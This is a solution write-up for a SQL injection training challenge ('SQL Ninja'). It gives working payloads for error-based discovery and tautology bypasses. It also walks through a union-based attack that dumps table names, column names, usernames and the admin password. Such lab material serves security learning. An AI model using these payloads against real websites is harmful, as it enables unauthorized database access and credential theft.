Solutions of Basic Injection challenge (SQL Ninja):

Basic Injection:
#1.
+ First, put a single quote at the end of url, we get a SQL error:
"Error While Selection process : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1"
+ So, we guess SQL query: select username from users where id='...'
+ Solution: Inject ...?id=1'or'1'='1 (SQL query becomes: select username from users where id='1' or '1'='1'

#2.
+ We get a SQL error when put a single quote at the end of url:
"Error While Selection process : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1"
+ Solution: ...?id=1 or 1=1

#3.
+ We get a SQL error when put a double (not single) quote at the end of url:
"Error While Selection process : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near "1"" at line 1"
+ Guess SQL query: select username from users where id="..."
+ Solution: ...?id=1" or "1"="1

#4.
+ We get SQL error when put a single quote at the end of url:
"Error While Selection process : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near "1")' at line 1"
+ Guess SQL query: select username from users where id=('...')
+ Solution: ...?id=1')or('1'='1

Death Row Injection:
(Reference: http://www.securityidiots.com/Web-Pentest/SQL-Injection/basic-injection-single-line-or-death.html)
#1.
+ Get a SQL error when put a single quote at the end of url:
"Error While Selection process : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near " and id=1'limit 1" at line 1"
+ Guess SQL query has "limit 1". So, we should use -...-- - to change SQL query
+ Try union-based injection: 
Put ...?id=-1 order by 6-- -, we get error: "Error While Selection process : Unknown column '6' in 'order clause'"
So, it is union-based injection
+ Find number of rows:
Try ...?id=-1 order by n-- -, with n=5,4,..,1 until get error "Invalid Input parameter".
In this case, we get n=5 (...?id=-1 order by 5 -- -)
+ Find death row:
...?id=-1 union select 1,2,3,4,5 -- -
Get message: "Username is : 2". So, death row is 2.
+ Get information:
Name of tables in DB: ...?id=-1 union select 1, group_concat(table_name),3,4,5 from information_schema.tables where table_schema=database() -- -
Get columns'name of table (ex: users): ...?id=-1 union select 1, group_concat(column_name), 3,4,5 from information_schema.columns where table_name = 'users' -- -
Get username: ...?id=-1 union select 1,group_concat(username),3,4,5 from (select username from users limit 0,100)a-- -
Get password: ...?id=-1 union select 1,password,3,4,5 from (select password from users where username='admin')a -- -
(Message: "Username is : [information]")

#2. ...?id=-1)) ... -- -
#3. ...?id=-1" ... -- -
#4. ...?id=-1") ... -- -
